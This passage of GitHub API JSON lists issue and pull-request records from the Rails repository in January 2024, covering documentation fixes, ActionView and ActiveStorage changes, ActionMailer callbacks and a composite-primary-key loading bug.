        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50864/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50864/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50864/events",
        "html_url": "https://github.com/rails/rails/pull/50864",
        "id": 2098280208,
        "node_id": "PR_kwDNIULOZPQKZw",
        "number": 50864,
        "title": "Mention Strict Locals in more documentation",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-24T13:33:36Z",
        "updated_at": "2024-01-25T21:45:48Z",
        "closed_at": "2024-01-25T21:01:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50864",
            "html_url": "https://github.com/rails/rails/pull/50864",
            "diff_url": "https://github.com/rails/rails/pull/50864.diff",
            "patch_url": "https://github.com/rails/rails/pull/50864.patch",
            "merged_at": "2024-01-25T21:01:18Z"
        },
        "body": "Motivation / Background\r\n---\r\n\r\nStrict Locals support was introduced in [#45727][] and announced as part of the [7.1 Release][]. There are several mentions across the Guides, but support is rarely mentioned in the API documentation.\r\n\r\nDetail\r\n----\r\n\r\nThis commit adds two test cases to ensure support for splatting additional arguments, and for forbidding block and positional arguments.\r\n\r\nIt also makes mention of strict locals in more places, and links to the guides.\r\n\r\n[#45727]: https://github.com/rails/rails/pull/45727\r\n[7.1 Release]: https://edgeguides.rubyonrails.org/7_1_release_notes.html#allow-templates-to-set-strict-locals\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50864/reactions",
            "total_count": 5,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50864/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50863",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50863/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50863/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50863/events",
        "html_url": "https://github.com/rails/rails/pull/50863",
        "id": 2098127830,
        "node_id": "PR_kwDNIULOZPH0_w",
        "number": 50863,
        "title": "Merge pull request #50789 from p8/docs/relative-includes [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T12:07:49Z",
        "updated_at": "2024-01-24T12:41:16Z",
        "closed_at": "2024-01-24T12:41:13Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50863",
            "html_url": "https://github.com/rails/rails/pull/50863",
            "diff_url": "https://github.com/rails/rails/pull/50863.diff",
            "patch_url": "https://github.com/rails/rails/pull/50863.patch",
            "merged_at": "2024-01-24T12:41:13Z"
        },
        "body": "\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50863/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50863/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50862",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50862/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50862/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50862/events",
        "html_url": "https://github.com/rails/rails/pull/50862",
        "id": 2097954073,
        "node_id": "PR_kwDNIULOZO-RWg",
        "number": 50862,
        "title": "Accept Tempfile as ActiveStorage attachable",
        "user": {
            "login": "shouichi",
            "id": 99586,
            "node_id": "MDQ6VXNlcjk5NTg2",
            "avatar_url": "https://avatars.githubusercontent.com/u/99586?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/shouichi",
            "html_url": "https://github.com/shouichi",
            "followers_url": "https://api.github.com/users/shouichi/followers",
            "following_url": "https://api.github.com/users/shouichi/following{/other_user}",
            "gists_url": "https://api.github.com/users/shouichi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/shouichi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/shouichi/subscriptions",
            "organizations_url": "https://api.github.com/users/shouichi/orgs",
            "repos_url": "https://api.github.com/users/shouichi/repos",
            "events_url": "https://api.github.com/users/shouichi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/shouichi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T10:31:28Z",
        "updated_at": "2024-02-06T06:21:59Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50862",
            "html_url": "https://github.com/rails/rails/pull/50862",
            "diff_url": "https://github.com/rails/rails/pull/50862.diff",
            "patch_url": "https://github.com/rails/rails/pull/50862.patch",
            "merged_at": null
        },
        "body": "`File` is already accepted as an attachable, so why not?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50862/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50862/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50861",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50861/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50861/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50861/events",
        "html_url": "https://github.com/rails/rails/pull/50861",
        "id": 2097724253,
        "node_id": "PR_kwDNIULOZOxlpw",
        "number": 50861,
        "title": "ActionView: Raise on invalid format",
        "user": {
            "login": "3v0k4",
            "id": 5238698,
            "node_id": "MDQ6VXNlcjUyMzg2OTg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5238698?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/3v0k4",
            "html_url": "https://github.com/3v0k4",
            "followers_url": "https://api.github.com/users/3v0k4/followers",
            "following_url": "https://api.github.com/users/3v0k4/following{/other_user}",
            "gists_url": "https://api.github.com/users/3v0k4/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/3v0k4/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/3v0k4/subscriptions",
            "organizations_url": "https://api.github.com/users/3v0k4/orgs",
            "repos_url": "https://api.github.com/users/3v0k4/repos",
            "events_url": "https://api.github.com/users/3v0k4/events{/privacy}",
            "received_events_url": "https://api.github.com/users/3v0k4/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T08:37:24Z",
        "updated_at": "2024-01-24T08:37:47Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50861",
            "html_url": "https://github.com/rails/rails/pull/50861",
            "diff_url": "https://github.com/rails/rails/pull/50861.diff",
            "patch_url": "https://github.com/rails/rails/pull/50861.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nFixes #45636 \r\n\r\n### Detail\r\n\r\nThis Pull Request adds a check in `ActionView::PathSet#find_all` to ensure all passed formats are valid.\r\n\r\nSince `#find_all` is used by `#exists?` and `#find`, the check is extended to all the public methods in the class that search templates.\r\n\r\n### Additional information\r\n\r\n.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50861/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50861/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50860",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50860/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50860/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50860/events",
        "html_url": "https://github.com/rails/rails/pull/50860",
        "id": 2097664922,
        "node_id": "PR_kwDNIULOZOuZSg",
        "number": 50860,
        "title": "Add \".[key]\" to the abstract namespaces [ci skip]",
        "user": {
            "login": "yykamei",
            "id": 13130705,
            "node_id": "MDQ6VXNlcjEzMTMwNzA1",
            "avatar_url": "https://avatars.githubusercontent.com/u/13130705?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yykamei",
            "html_url": "https://github.com/yykamei",
            "followers_url": "https://api.github.com/users/yykamei/followers",
            "following_url": "https://api.github.com/users/yykamei/following{/other_user}",
            "gists_url": "https://api.github.com/users/yykamei/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yykamei/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yykamei/subscriptions",
            "organizations_url": "https://api.github.com/users/yykamei/orgs",
            "repos_url": "https://api.github.com/users/yykamei/repos",
            "events_url": "https://api.github.com/users/yykamei/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yykamei/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T07:58:00Z",
        "updated_at": "2024-01-29T23:59:56Z",
        "closed_at": "2024-01-29T22:45:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50860",
            "html_url": "https://github.com/rails/rails/pull/50860",
            "diff_url": "https://github.com/rails/rails/pull/50860.diff",
            "patch_url": "https://github.com/rails/rails/pull/50860.patch",
            "merged_at": "2024-01-29T22:45:55Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe section \"Error Message Scopes\" describes how the Rails look up the namespaces for a validation error message with code snippets. The first code snippet shows abstract namespaces like `errors.attributes.[attribute_name]` while the second one demonstrates the materialized one like `errors.attributes.name.blank`. The first code snippet lacks the validation error \"key.\" My team member was confused and created a translation without \"key\", so I think it would be helpful to add \".[key]\" to the abstract namespaces.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* ~[ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.~\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* ~[ ] Tests are added or updated if you fix a bug or add a feature.~\r\n* ~[ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.~\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50860/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50860/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50859",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50859/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50859/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50859/events",
        "html_url": "https://github.com/rails/rails/pull/50859",
        "id": 2097204679,
        "node_id": "PR_kwDNIULOZOV7WA",
        "number": 50859,
        "title": "Don't mutate row arrays that come back from the database adapter",
        "user": {
            "login": "tenderlove",
            "id": 3124,
            "node_id": "MDQ6VXNlcjMxMjQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3124?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tenderlove",
            "html_url": "https://github.com/tenderlove",
            "followers_url": "https://api.github.com/users/tenderlove/followers",
            "following_url": "https://api.github.com/users/tenderlove/following{/other_user}",
            "gists_url": "https://api.github.com/users/tenderlove/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tenderlove/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tenderlove/subscriptions",
            "organizations_url": "https://api.github.com/users/tenderlove/orgs",
            "repos_url": "https://api.github.com/users/tenderlove/repos",
            "events_url": "https://api.github.com/users/tenderlove/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tenderlove/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T00:34:35Z",
        "updated_at": "2024-01-24T00:49:09Z",
        "closed_at": "2024-01-24T00:49:08Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50859",
            "html_url": "https://github.com/rails/rails/pull/50859",
            "diff_url": "https://github.com/rails/rails/pull/50859.diff",
            "patch_url": "https://github.com/rails/rails/pull/50859.patch",
            "merged_at": "2024-01-24T00:49:08Z"
        },
        "body": "In SQLite3-Ruby version 2.0, I would like to make row arrays frozen. I tested the change, and it only breaks this test, so I'm changing the test. I don't think we should be mutating the objects that the database adapter returns",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50859/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50859/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50858",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50858/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50858/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50858/events",
        "html_url": "https://github.com/rails/rails/pull/50858",
        "id": 2097141500,
        "node_id": "PR_kwDNIULOZOSs4A",
        "number": 50858,
        "title": "Support options for ActionMailer delivery callbacks",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T23:16:27Z",
        "updated_at": "2024-01-23T23:16:31Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50858",
            "html_url": "https://github.com/rails/rails/pull/50858",
            "diff_url": "https://github.com/rails/rails/pull/50858.diff",
            "patch_url": "https://github.com/rails/rails/pull/50858.patch",
            "merged_at": null
        },
        "body": "Closes https://github.com/rails/rails/issues/50830.\r\n\r\nThe code works, but docs/tests etc are currently missing. I want to validate the approach before proceeding.\r\n\r\nInside action mailer I am reusing private methods from the implementation of callbacks from the action controller, see https://github.com/rails/rails/blob/main/actionpack/lib/abstract_controller/callbacks.rb.\r\n\r\nThe questions to consider are:\r\n1. Should the mailer callbacks really depend on the internals of controller callbacks, considering that it already includes it https://github.com/rails/rails/blob/776626ff987a96201b0bdbd86d716ca6698fa8b3/actionmailer/lib/action_mailer/base.rb#L493\r\n2. Controllers callbacks have a `raise_on_missing_callbacks_action`, see https://github.com/rails/rails/blob/776626ff987a96201b0bdbd86d716ca6698fa8b3/actionpack/lib/abstract_controller/callbacks.rb#L36 which can be set via `config.action_controller. raise_on_missing_callbacks_action`. This kinda makes sense for action mailer too, so should we introduce `config.action_mailer.raise_on_missing_callbacks_action` config? \r\n3. Controller callbacks use the word `\"controller\"`, see https://github.com/rails/rails/blob/776626ff987a96201b0bdbd86d716ca6698fa8b3/actionpack/lib/abstract_controller/callbacks.rb#L54, while for mailer we should use the `\"mailer\"` word or should we make the message text more generic? \r\n\r\ncc @bensheldon ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50858/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50858/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50857",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50857/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50857/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50857/events",
        "html_url": "https://github.com/rails/rails/issues/50857",
        "id": 2097025664,
        "node_id": "I_kwDNIULOfP4SgA",
        "number": 50857,
        "title": "eager_load, includes load wrong data using composite primary keys and query_constraints",
        "user": {
            "login": "ylansegal",
            "id": 561180,
            "node_id": "MDQ6VXNlcjU2MTE4MA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/561180?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ylansegal",
            "html_url": "https://github.com/ylansegal",
            "followers_url": "https://api.github.com/users/ylansegal/followers",
            "following_url": "https://api.github.com/users/ylansegal/following{/other_user}",
            "gists_url": "https://api.github.com/users/ylansegal/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ylansegal/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ylansegal/subscriptions",
            "organizations_url": "https://api.github.com/users/ylansegal/orgs",
            "repos_url": "https://api.github.com/users/ylansegal/repos",
            "events_url": "https://api.github.com/users/ylansegal/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ylansegal/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "nvasilevski",
                "id": 5512772,
                "node_id": "MDQ6VXNlcjU1MTI3NzI=",
                "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/nvasilevski",
                "html_url": "https://github.com/nvasilevski",
                "followers_url": "https://api.github.com/users/nvasilevski/followers",
                "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
                "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
                "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
                "repos_url": "https://api.github.com/users/nvasilevski/repos",
                "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
                "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-23T21:35:03Z",
        "updated_at": "2024-01-25T17:34:32Z",
        "closed_at": "2024-01-25T15:47:32Z",
        "author_association": "NONE",
        "active_lock_reason": null,
